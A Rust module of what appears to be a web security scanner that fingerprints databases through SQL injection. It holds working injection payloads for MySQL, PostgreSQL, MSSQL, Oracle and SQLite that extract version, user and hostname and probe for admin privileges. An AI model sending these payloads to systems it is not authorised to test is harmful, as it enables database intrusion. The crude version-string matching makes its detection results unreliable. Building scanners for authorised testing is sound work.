use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::detection::analyzer::{Finding, Severity};
use anyhow::Result;

/// Database fingerprinting and enumeration module
pub struct DatabaseFingerprinter {
    client: HttpClient,
    findings: Vec<Finding>,
    target: String,
}

#[derive(Debug, Clone)]
pub struct DatabaseInfo {
    pub db_type: String,
    pub version: Option<String>,
    pub user: Option<String>,
    pub current_db: Option<String>,
    pub hostname: Option<String>,
    pub privileges: Vec<String>,
}

impl DatabaseFingerprinter {
    pub fn new(target: String, timeout_secs: u64, insecure: bool) -> Result<Self> {
        let client = HttpClient::new(timeout_secs, insecure)?;
        Ok(Self {
            client,
            findings: Vec::new(),
            target,
        })
    }

    /// Comprehensive database fingerprinting
    pub async fn fingerprint_database(&mut self, url: &str, param: &str) -> Result<Option<DatabaseInfo>, Box<dyn std::error::Error>> {
        println!("[*] Fingerprinting database at {} via parameter {} (target: {})", url, param, self.target);

        // Test for different database types
        let mut db_info = None;

        // MySQL fingerprinting
        if let Some(mysql_info) = self.test_mysql(url, param).await? {
            db_info = Some(mysql_info);
        }
        // PostgreSQL fingerprinting
        else if let Some(pg_info) = self.test_postgresql(url, param).await? {
            db_info = Some(pg_info);
        }
        // MSSQL fingerprinting
        else if let Some(mssql_info) = self.test_mssql(url, param).await? {
            db_info = Some(mssql_info);
        }
        // Oracle fingerprinting
        else if let Some(oracle_info) = self.test_oracle(url, param).await? {
            db_info = Some(oracle_info);
        }
        // SQLite fingerprinting
        else if let Some(sqlite_info) = self.test_sqlite(url, param).await? {
            db_info = Some(sqlite_info);
        }

        if let Some(ref info) = db_info {
            println!("[+] Database identified: {} {}", info.db_type, 
                    info.version.as_ref().unwrap_or(&"unknown".to_string()));
            
            self.findings.push(
                Finding::new(
                    url,
                    Severity::Medium,
                    &format!("Database Fingerprinted: {}", info.db_type),
                    &format!("Database type and version information extracted: {} {}", 
                           info.db_type, info.version.as_ref().unwrap_or(&"unknown".to_string()))
                )
                .with_evidence(&format!("Parameter: {} | Database: {} | Version: {}", 
                                        param, info.db_type, 
                                        info.version.as_ref().unwrap_or(&"unknown".to_string())))
                .with_remediation("Restrict database information disclosure and implement proper error handling")
            );
        }

        Ok(db_info)
    }

    /// Test for MySQL database
    async fn test_mysql(&self, url: &str, param: &str) -> Result<Option<DatabaseInfo>, Box<dyn std::error::Error>> {
        let mysql_tests = vec![
            ("version", "' AND (SELECT @@version) IS NOT NULL--"),
            ("version_comment", "' AND (SELECT @@version_comment) LIKE '%MySQL%'--"),
            ("datadir", "' AND (SELECT @@datadir) IS NOT NULL--"),
            ("hostname", "' AND (SELECT @@hostname) IS NOT NULL--"),
            ("user", "' AND (SELECT USER()) IS NOT NULL--"),
            ("database", "' AND (SELECT DATABASE()) IS NOT NULL--"),
        ];

        let mut info = DatabaseInfo {
            db_type: "MySQL".to_string(),
            version: None,
            user: None,
            current_db: None,
            hostname: None,
            privileges: Vec::new(),
        };

        let mut mysql_detected = false;

        for (field, payload) in mysql_tests {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    if response_text.contains("mysql") || 
                       response_text.contains("MySQL") ||
                       response_text.contains("5.") ||
                       response_text.contains("8.") {
                        mysql_detected = true;
                        
                        // Extract specific information
                        match field {
                            "version" => {
                                if let Some(version) = self.extract_mysql_version(&response_text) {
                                    info.version = Some(version);
                                }
                            }
                            "user" => {
                                if let Some(user) = self.extract_mysql_user(&response_text) {
                                    info.user = Some(user);
                                }
                            }
                            "database" => {
                                if let Some(db) = self.extract_mysql_database(&response_text) {
                                    info.current_db = Some(db);
                                }
                            }
                            "hostname" => {
                                if let Some(hostname) = self.extract_mysql_hostname(&response_text) {
                                    info.hostname = Some(hostname);
                                }
                            }
                            _ => {}
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        if mysql_detected {
            // Get privileges
            info.privileges = self.get_mysql_privileges(url, param).await?;
            Ok(Some(info))
        } else {
            Ok(None)
        }
    }

    /// Test for PostgreSQL database
    async fn test_postgresql(&self, url: &str, param: &str) -> Result<Option<DatabaseInfo>, Box<dyn std::error::Error>> {
        let pg_tests = vec![
            ("version", "' AND (SELECT version()) IS NOT NULL--"),
            ("user", "' AND (SELECT current_user) IS NOT NULL--"),
            ("database", "' AND (SELECT current_database()) IS NOT NULL--"),
            ("schema", "' AND (SELECT current_schema()) IS NOT NULL--"),
        ];

        let mut info = DatabaseInfo {
            db_type: "PostgreSQL".to_string(),
            version: None,
            user: None,
            current_db: None,
            hostname: None,
            privileges: Vec::new(),
        };

        let mut pg_detected = false;

        for (field, payload) in pg_tests {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    if response_text.contains("PostgreSQL") ||
                       response_text.contains("postgresql") ||
                       response_text.contains("psql") ||
                       response_text.contains("9.") ||
                       response_text.contains("10.") ||
                       response_text.contains("11.") ||
                       response_text.contains("12.") ||
                       response_text.contains("13.") ||
                       response_text.contains("14.") ||
                       response_text.contains("15.") {
                        pg_detected = true;
                        
                        match field {
                            "version" => {
                                if let Some(version) = self.extract_pg_version(&response_text) {
                                    info.version = Some(version);
                                }
                            }
                            "user" => {
                                if let Some(user) = self.extract_pg_user(&response_text) {
                                    info.user = Some(user);
                                }
                            }
                            "database" => {
                                if let Some(db) = self.extract_pg_database(&response_text) {
                                    info.current_db = Some(db);
                                }
                            }
                            _ => {}
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        if pg_detected {
            info.privileges = self.get_pg_privileges(url, param).await?;
            Ok(Some(info))
        } else {
            Ok(None)
        }
    }

    /// Test for MSSQL database
    async fn test_mssql(&self, url: &str, param: &str) -> Result<Option<DatabaseInfo>, Box<dyn std::error::Error>> {
        let mssql_tests = vec![
            ("version", "' AND (SELECT @@VERSION) IS NOT NULL--"),
            ("user", "' AND (SELECT SYSTEM_USER) IS NOT NULL--"),
            ("database", "' AND (SELECT DB_NAME()) IS NOT NULL--"),
            ("hostname", "' AND (SELECT @@SERVERNAME) IS NOT NULL--"),
        ];

        let mut info = DatabaseInfo {
            db_type: "MSSQL".to_string(),
            version: None,
            user: None,
            current_db: None,
            hostname: None,
            privileges: Vec::new(),
        };

        let mut mssql_detected = false;

        for (field, payload) in mssql_tests {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    if response_text.contains("Microsoft SQL Server") ||
                       response_text.contains("SQL Server") ||
                       response_text.contains("2016") ||
                       response_text.contains("2017") ||
                       response_text.contains("2019") ||
                       response_text.contains("2022") {
                        mssql_detected = true;
                        
                        match field {
                            "version" => {
                                if let Some(version) = self.extract_mssql_version(&response_text) {
                                    info.version = Some(version);
                                }
                            }
                            "user" => {
                                if let Some(user) = self.extract_mssql_user(&response_text) {
                                    info.user = Some(user);
                                }
                            }
                            "database" => {
                                if let Some(db) = self.extract_mssql_database(&response_text) {
                                    info.current_db = Some(db);
                                }
                            }
                            "hostname" => {
                                if let Some(hostname) = self.extract_mssql_hostname(&response_text) {
                                    info.hostname = Some(hostname);
                                }
                            }
                            _ => {}
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        if mssql_detected {
            info.privileges = self.get_mssql_privileges(url, param).await?;
            Ok(Some(info))
        } else {
            Ok(None)
        }
    }

    /// Test for Oracle database
    async fn test_oracle(&self, url: &str, param: &str) -> Result<Option<DatabaseInfo>, Box<dyn std::error::Error>> {
        let oracle_tests = vec![
            ("version", "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL--"),
            ("user", "' AND (SELECT user FROM dual) IS NOT NULL--"),
            ("instance", "' AND (SELECT instance_name FROM v$instance) IS NOT NULL--"),
            ("hostname", "' AND (SELECT host_name FROM v$instance) IS NOT NULL--"),
        ];

        let mut info = DatabaseInfo {
            db_type: "Oracle".to_string(),
            version: None,
            user: None,
            current_db: None,
            hostname: None,
            privileges: Vec::new(),
        };

        let mut oracle_detected = false;

        for (field, payload) in oracle_tests {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    if response_text.contains("Oracle") ||
                       response_text.contains("ORA-") ||
                       response_text.contains("Database") {
                        oracle_detected = true;
                        
                        match field {
                            "version" => {
                                if let Some(version) = self.extract_oracle_version(&response_text) {
                                    info.version = Some(version);
                                }
                            }
                            "user" => {
                                if let Some(user) = self.extract_oracle_user(&response_text) {
                                    info.user = Some(user);
                                }
                            }
                            _ => {}
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        if oracle_detected {
            info.privileges = self.get_oracle_privileges(url, param).await?;
            Ok(Some(info))
        } else {
            Ok(None)
        }
    }

    /// Test for SQLite database
    async fn test_sqlite(&self, url: &str, param: &str) -> Result<Option<DatabaseInfo>, Box<dyn std::error::Error>> {
        let sqlite_tests = vec![
            ("version", "' AND (SELECT sqlite_version()) IS NOT NULL--"),
            ("tables", "' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) IS NOT NULL--"),
        ];

        let mut info = DatabaseInfo {
            db_type: "SQLite".to_string(),
            version: None,
            user: None,
            current_db: None,
            hostname: None,
            privileges: Vec::new(),
        };

        let mut sqlite_detected = false;

        for (field, payload) in sqlite_tests {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    
                    if response_text.contains("SQLite") ||
                       response_text.contains("sqlite") {
                        sqlite_detected = true;
                        
                        match field {
                            "version" => {
                                if let Some(version) = self.extract_sqlite_version(&response_text) {
                                    info.version = Some(version);
                                }
                            }
                            _ => {}
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        if sqlite_detected {
            Ok(Some(info))
        } else {
            Ok(None)
        }
    }

    // Helper methods for extracting specific database information
    fn extract_mysql_version(&self, response: &str) -> Option<String> {
        // Extract MySQL version from response
        if let Some(start) = response.find("mysql") {
            let version_part = &response[start..];
            if let Some(end) = version_part.find(',') {
                Some(version_part[..end].to_string())
            } else {
                Some(version_part.lines().next()?.to_string())
            }
        } else {
            None
        }
    }

    fn extract_mysql_user(&self, response: &str) -> Option<String> {
        // Extract MySQL user from response
        if let Some(start) = response.find("@") {
            let user_part = &response[..start];
            Some(user_part.to_string())
        } else {
            None
        }
    }

    fn extract_mysql_database(&self, response: &str) -> Option<String> {
        // Extract current database from response
        response.lines()
            .find(|line| line.contains("database"))
            .map(|line| line.to_string())
    }

    fn extract_mysql_hostname(&self, response: &str) -> Option<String> {
        // Extract hostname from response
        response.lines()
            .find(|line| line.contains("host") || line.contains("server"))
            .map(|line| line.to_string())
    }

    fn extract_pg_version(&self, response: &str) -> Option<String> {
        // Extract PostgreSQL version from response
        if let Some(start) = response.find("PostgreSQL") {
            let version_part = &response[start..];
            if let Some(end) = version_part.find(',') {
                Some(version_part[..end].to_string())
            } else {
                Some(version_part.lines().next()?.to_string())
            }
        } else {
            None
        }
    }

    fn extract_pg_user(&self, response: &str) -> Option<String> {
        // Extract PostgreSQL user from response
        response.lines()
            .find(|line| line.contains("current_user"))
            .map(|line| line.to_string())
    }

    fn extract_pg_database(&self, response: &str) -> Option<String> {
        // Extract current database from response
        response.lines()
            .find(|line| line.contains("current_database"))
            .map(|line| line.to_string())
    }

    fn extract_mssql_version(&self, response: &str) -> Option<String> {
        // Extract MSSQL version from response
        if let Some(start) = response.find("Microsoft SQL Server") {
            let version_part = &response[start..];
            if let Some(end) = version_part.find('\n') {
                Some(version_part[..end].to_string())
            } else {
                Some(version_part.to_string())
            }
        } else {
            None
        }
    }

    fn extract_mssql_user(&self, response: &str) -> Option<String> {
        // Extract MSSQL user from response
        response.lines()
            .find(|line| line.contains("SYSTEM_USER"))
            .map(|line| line.to_string())
    }

    fn extract_mssql_database(&self, response: &str) -> Option<String> {
        // Extract current database from response
        response.lines()
            .find(|line| line.contains("DB_NAME"))
            .map(|line| line.to_string())
    }

    fn extract_mssql_hostname(&self, response: &str) -> Option<String> {
        // Extract hostname from response
        response.lines()
            .find(|line| line.contains("@@SERVERNAME"))
            .map(|line| line.to_string())
    }

    fn extract_oracle_version(&self, response: &str) -> Option<String> {
        // Extract Oracle version from response
        if let Some(start) = response.find("Oracle") {
            let version_part = &response[start..];
            if let Some(end) = version_part.find('\n') {
                Some(version_part[..end].to_string())
            } else {
                Some(version_part.to_string())
            }
        } else {
            None
        }
    }

    fn extract_oracle_user(&self, response: &str) -> Option<String> {
        // Extract Oracle user from response
        response.lines()
            .find(|line| line.contains("user"))
            .map(|line| line.to_string())
    }

    fn extract_sqlite_version(&self, response: &str) -> Option<String> {
        // Extract SQLite version from response
        if let Some(start) = response.find("sqlite") {
            let version_part = &response[start..];
            if let Some(end) = version_part.find(',') {
                Some(version_part[..end].to_string())
            } else {
                Some(version_part.lines().next()?.to_string())
            }
        } else {
            None
        }
    }

    // Methods to get privileges for different databases
    async fn get_mysql_privileges(&self, url: &str, param: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let mut privileges = Vec::new();
        
        let privilege_payloads = vec![
            ("file_priv", "' AND (SELECT File_priv FROM mysql.user WHERE User=USER() LIMIT 1)='Y'--"),
            ("process_priv", "' AND (SELECT Process_priv FROM mysql.user WHERE User=USER() LIMIT 1)='Y'--"),
            ("super_priv", "' AND (SELECT Super_priv FROM mysql.user WHERE User=USER() LIMIT 1)='Y'--"),
        ];

        for (priv_name, payload) in privilege_payloads {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    if !response_text.contains("error") {
                        privileges.push(priv_name.to_string());
                    }
                }
                Err(_) => continue,
            }
        }

        Ok(privileges)
    }

    async fn get_pg_privileges(&self, url: &str, param: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let mut privileges = Vec::new();
        
        let privilege_payloads = vec![
            ("superuser", "' AND (SELECT usesuper FROM pg_user WHERE usename=current_user)='t'--"),
            ("create_db", "' AND (SELECT createdb FROM pg_user WHERE usename=current_user)='t'--"),
            ("create_user", "' AND (SELECT createrole FROM pg_user WHERE usename=current_user)='t'--"),
        ];

        for (priv_name, payload) in privilege_payloads {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    if !response_text.contains("error") {
                        privileges.push(priv_name.to_string());
                    }
                }
                Err(_) => continue,
            }
        }

        Ok(privileges)
    }

    async fn get_mssql_privileges(&self, url: &str, param: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let mut privileges = Vec::new();
        
        let privilege_payloads = vec![
            ("sysadmin", "' AND IS_SRVROLEMEMBER('sysadmin')=1--"),
            ("db_owner", "' AND IS_MEMBER('db_owner')=1--"),
            ("serveradmin", "' AND IS_SRVROLEMEMBER('serveradmin')=1--"),
        ];

        for (priv_name, payload) in privilege_payloads {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    if !response_text.contains("error") {
                        privileges.push(priv_name.to_string());
                    }
                }
                Err(_) => continue,
            }
        }

        Ok(privileges)
    }

    async fn get_oracle_privileges(&self, url: &str, param: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let mut privileges = Vec::new();
        
        let privilege_payloads = vec![
            ("dba", "' AND (SELECT COUNT(*) FROM DBA_TAB_PRIVS WHERE GRANTEE=USER)>0--"),
            ("sys", "' AND (SELECT COUNT(*) FROM SYS.DBA_USERS WHERE USERNAME=USER)>0--"),
        ];

        for (priv_name, payload) in privilege_payloads {
            match self.make_request(url, param, payload).await {
                Ok(resp) => {
                    let response_text = resp.body;
                    if !response_text.contains("error") {
                        privileges.push(priv_name.to_string());
                    }
                }
                Err(_) => continue,
            }
        }

        Ok(privileges)
    }

    /// Helper method to make requests with proper error handling
    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        use crate::utils::url::UrlUtil;
        let request_url = UrlUtil::inject_param(url, param, value);
        let request = HttpRequest::get(&request_url);
        self.client.send(request).await
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_db_fingerprinter_creation() {
        let fingerprinter = DatabaseFingerprinter::new("https://example.com".to_string(), 30, true).unwrap();
        assert_eq!(fingerprinter.target, "https://example.com");
    }
}
